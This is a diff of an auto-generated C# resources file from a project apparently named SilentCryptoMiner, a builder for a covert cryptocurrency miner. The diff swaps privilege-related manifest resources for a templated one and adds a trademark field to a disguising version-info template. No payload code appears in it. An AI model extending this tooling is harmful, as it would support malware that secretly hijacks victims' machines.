@@ -61,16 +61,6 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        public static byte[] administrator {
-            get {
-                object obj = ResourceManager.GetObject("administrator", resourceCulture);
-                return ((byte[])(obj));
-            }
-        }
-        
-        /// <summary>
         ///   Looks up a localized string similar to using System;
         ///using System.IO;
         ///using System.IO.Compression;
@@ -271,9 +261,7 @@ namespace SilentCryptoMiner.Properties {
         ///   Looks up a localized string similar to #ifdef DefIcon
         ///MAINICON ICON &quot;#ICON&quot;
         ///#endif
-        ///#ifdef DefAdmin
-        ///1 24 &quot;administrator.manifest&quot;
-        ///#endif
+        ///1 24 &quot;loader.manifest&quot;
         ///#ifdef DefAssembly
         ///1 VERSIONINFO
         ///FILEVERSION     #VERSION
@@ -288,7 +276,8 @@ namespace SilentCryptoMiner.Properties {
         ///            VALUE &quot;FileDescription&quot;, &quot;#DESCRIPTION&quot;
         ///            VALUE &quot;FileVersion&quot;, &quot;#VERSION&quot;
         ///            VALUE &quot;LegalCopyright&quot;, &quot;#COPYRIGHT&quot;
-        ///			VALUE &quot; [rest of string was truncated]&quot;;.
+        ///			VALUE &quot;LegalTrademark&quot;, &quot;#TRADEMARK&quot;
+        ///  [rest of string was truncated]&quot;;.
         /// </summary>
         public static string resource {
             get {
@@ -327,6 +316,21 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
+        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; 
+        ///&lt;asmv1:assembly manifestVersion=&quot;1.0&quot; xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; xmlns:asmv1=&quot;urn:schemas-microsoft-com:asm.v1&quot; xmlns:asmv2=&quot;urn:schemas-microsoft-com:asm.v2&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
+        ///    &lt;assemblyIdentity version=&quot;#MANIFESTVERSION&quot; name=&quot;#MANIFESTNAME&quot; /&gt;
+        ///    &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v2&quot;&gt;
+        ///        &lt;security&gt;
+        ///            &lt;requestedPrivileges xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;
+        ///                &lt;re [rest of string was truncated]&quot;;.
+        /// </summary>
+        public static string template {
+            get {
+                return ResourceManager.GetString("template", resourceCulture);
+            }
+        }
+        
+        /// <summary>
         ///   Looks up a localized string similar to using System;
         ///using System.IO;
         ///using System.IO.Compression;
@@ -352,16 +356,6 @@ namespace SilentCryptoMiner.Properties {
         public static string Uninstaller {
             get {
                 return ResourceManager.GetString("Uninstaller", resourceCulture);
-            }
-        }
-        
-        /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        public static byte[] user {
-            get {
-                object obj = ResourceManager.GetObject("user", resourceCulture);
-                return ((byte[])(obj));
             }
         }
         
